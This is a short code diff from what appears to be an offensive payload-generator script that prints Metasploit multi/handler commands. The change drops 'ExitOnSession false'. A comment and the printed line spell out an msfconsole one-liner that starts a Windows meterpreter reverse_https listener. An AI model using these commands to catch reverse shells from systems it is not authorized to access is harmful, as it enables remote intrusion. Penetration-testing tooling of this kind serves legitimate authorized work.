@@ -274,7 +274,7 @@ def main():
             print("Multi handler:")
             print(colored(f"\tset payload {msf_payload}", "cyan"))
             # msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost 192.168.119.158; set lport 443; run"
-            print(colored(f"\tmsfconsole -q -x \"use exploit/multi/handler; set payload {msf_payload}; set lhost {config_data['lhost']}; set lport {config_data['lport']}; set ExitOnSession false; run\"","cyan"))
+            print(colored(f"\tmsfconsole -q -x \"use exploit/multi/handler; set payload {msf_payload}; set lhost {config_data['lhost']}; set lport {config_data['lport']}; run\"","cyan"))
 
             # create output directory if not exist
             if (not os.path.exists(os.getcwd()+"/output")):
